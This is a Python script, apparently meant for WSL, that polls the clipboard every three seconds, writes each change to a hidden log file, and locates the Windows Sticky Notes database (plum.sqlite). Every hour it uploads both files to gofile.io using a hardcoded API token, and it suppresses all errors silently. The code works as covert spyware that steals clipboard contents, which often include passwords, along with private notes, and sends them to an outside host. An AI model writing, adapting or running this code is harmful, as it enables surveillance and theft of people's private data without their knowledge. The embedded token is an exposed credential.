import time
import subprocess
import requests
from datetime import datetime
import threading
import os

def get_clipboard_content():
    try:
        result = subprocess.run(['xclip', '-selection', 'clipboard', '-o'], capture_output=True, text=True)
        return result.stdout.strip() if result.returncode == 0 else None
    except:
        return None

def log_clipboard_update(content, file_path):
    with open(file_path, 'a') as f:
        f.write(f"Time: {datetime.now()}\n{content}\n\n")

def upload_file(file_path, api_token):
    try:
        last_modified_time = os.path.getmtime(file_path)
        if not hasattr(upload_file, 'last_uploaded_time'):
            upload_file.last_uploaded_time = {}
        if file_path not in upload_file.last_uploaded_time or last_modified_time > upload_file.last_uploaded_time[file_path]:
            with open(file_path, "rb") as f:
                response = requests.post(
                    "https://store9.gofile.io/uploadFile",
                    files={"file": f},
                    data={"token": api_token}
                )
                if response.status_code == 200:
                    upload_file.last_uploaded_time[file_path] = last_modified_time
    except:
        pass

def monitor_clipboard(file_path):
    last_content = ""
    while True:
        current_content = get_clipboard_content()
        if current_content and current_content != last_content:
            log_clipboard_update(current_content, file_path)
            last_content = current_content
        time.sleep(3)

def periodic_upload(files, api_token):
    while True:
        for file_path in files:
            upload_file(file_path, api_token)
        time.sleep(3600)

def get_windows_username():
    try:
        result = subprocess.run(["powershell.exe", "-Command", "[System.Environment]::UserName"], capture_output=True, text=True)
        if result.returncode == 0:
            return result.stdout.strip()
    except:
        return ""
    return ""

if __name__ == '__main__':
    clipboard_log_path = os.path.expanduser("~/dev/ba.txt")
    windows_user = get_windows_username()
    if not windows_user:
        pass

    sticky_notes_path = f"/mnt/c/Users/{windows_user}/AppData/Local/Packages/Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe/LocalState/plum.sqlite"
    
    if not os.path.isfile(sticky_notes_path):
        pass
    
    api_token = "jnJSH32mlnYRiF7uyJ2d7PQg0CLAqKcq"
    os.makedirs(os.path.dirname(clipboard_log_path), exist_ok=True)
    open(clipboard_log_path, 'a').close()

    threading.Thread(target=monitor_clipboard, args=(clipboard_log_path,)).start()
    threading.Thread(target=periodic_upload, args=([clipboard_log_path, sticky_notes_path], api_token)).start()
